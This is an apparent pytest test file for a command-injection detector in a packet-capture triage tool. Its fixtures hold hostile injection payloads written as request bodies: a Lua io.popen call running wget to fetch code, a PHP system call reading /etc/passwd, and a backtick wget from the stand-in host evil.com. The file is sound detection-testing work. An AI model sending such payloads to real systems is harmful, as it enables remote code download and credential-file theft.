"""
Тесты CommandInjectionDetector.

Не требует ни pipeline, ни reassembly — создаём state.http_objects
напрямую через объекты HttpObject.
"""
from pcap_triage.config import Config
from pcap_triage.detectors.command_injection import CommandInjectionDetector
from pcap_triage.http_object import HttpObject
from pcap_triage.models import CaptureState, FlowKey


def _state(*requests):
    """
    requests: list of (src_ip, uri, body_bytes).
    Строит минимальный CaptureState с http_objects.
    """
    state = CaptureState()
    objs = []
    for i, (src_ip, uri, body) in enumerate(requests):
        key = FlowKey(
            proto="tcp", src_ip=src_ip, dst_ip="10.0.0.1",
            src_port=50000 + i, dst_port=80,
        )
        obj = HttpObject(
            kind="request",
            method="POST",
            uri=uri,
            headers={"host": "target.local"},
            body=body,
            body_size=len(body),
        )
        objs.append((key, obj))
    state.http_objects = objs
    return state


def test_command_injection_lua_popen():
    """io.popen — high-паттерн, confidence 0.9."""
    body = (
        b"username=anonymous%00]]%0dlocal+h+%3d+io.popen"
        b'("wget http://10.0.1.152/x")%0d'
    )
    state = _state(("10.0.1.50", "/loginok.html", body))
    findings = CommandInjectionDetector().run(state, Config())

    assert len(findings) == 1
    assert findings[0].type == "command_injection"
    assert findings[0].confidence == 0.9
    assert "io.popen" in findings[0].evidence["matched_patterns"]


def test_command_injection_php_system():
    """system( в body — high."""
    body = b"cmd=;system('cat /etc/passwd');"
    state = _state(("10.0.1.50", "/upload.php", body))
    findings = CommandInjectionDetector().run(state, Config())
    assert len(findings) == 1
    assert findings[0].confidence == 0.9
    assert "system(" in findings[0].evidence["matched_patterns"]


def test_command_injection_shell_backtick():
    """Backticks + wget — 2 medium, confidence 0.75."""
    body = b"q=`wget http://evil.com/s.sh`"
    state = _state(("10.0.1.50", "/api", body))
    findings = CommandInjectionDetector().run(state, Config())
    assert len(findings) == 1
    assert findings[0].confidence == 0.75


def test_command_injection_single_medium_not_flagged():
    """Один medium — не finding (шумно)."""
    body = b"search=whoami"
    state = _state(("10.0.1.50", "/search", body))
    findings = CommandInjectionDetector().run(state, Config())
    assert findings == []


def test_command_injection_normal_login():
    """Нормальный логин — нет finding."""
    body = b"username=admin&password=secret123"
    state = _state(("10.0.1.50", "/login", body))
    findings = CommandInjectionDetector().run(state, Config())
    assert findings == []


def test_command_injection_empty_body():
    """Пустой body — нет finding."""
    state = _state(("10.0.1.50", "/api/health", b""))
    findings = CommandInjectionDetector().run(state, Config())
    assert findings == []


def test_command_injection_response_ignored():
    """Response не проверяется — только request."""
    from pcap_triage.models import FlowKey
    state = CaptureState()
    key = FlowKey(
        proto="tcp", src_ip="10.0.0.1", dst_ip="10.0.1.50",
        src_port=80, dst_port=50000,
    )
    obj = HttpObject(
        kind="response",
        status_code=200,
        body=b"system('ls')",  # в response это не команда
    )
    state.http_objects = [(key, obj)]
    findings = CommandInjectionDetector().run(state, Config())
    assert findings == []


def test_command_injection_aggregates_same_uri():
    """5 POST на /loginok.html с io.popen — один finding."""
    body = b"u=x%00io.popen('id')"
    requests = [("10.0.1.50", "/loginok.html", body)] * 5
    state = _state(*requests)
    findings = CommandInjectionDetector().run(state, Config())
    assert len(findings) == 1
    assert findings[0].evidence["count"] == 5


def test_command_injection_separate_uris():
    """Разные URI — разные findings."""
    b1 = b"x=io.popen('id')"
    b2 = b"y=system('ls')"
    state = _state(
        ("10.0.1.50", "/a.php", b1),
        ("10.0.1.50", "/b.php", b2),
    )
    findings = CommandInjectionDetector().run(state, Config())
    assert len(findings) == 2


def test_command_injection_empty_state():
    """Пустой state — не падает."""
    findings = CommandInjectionDetector().run(CaptureState(), Config())
    assert findings == []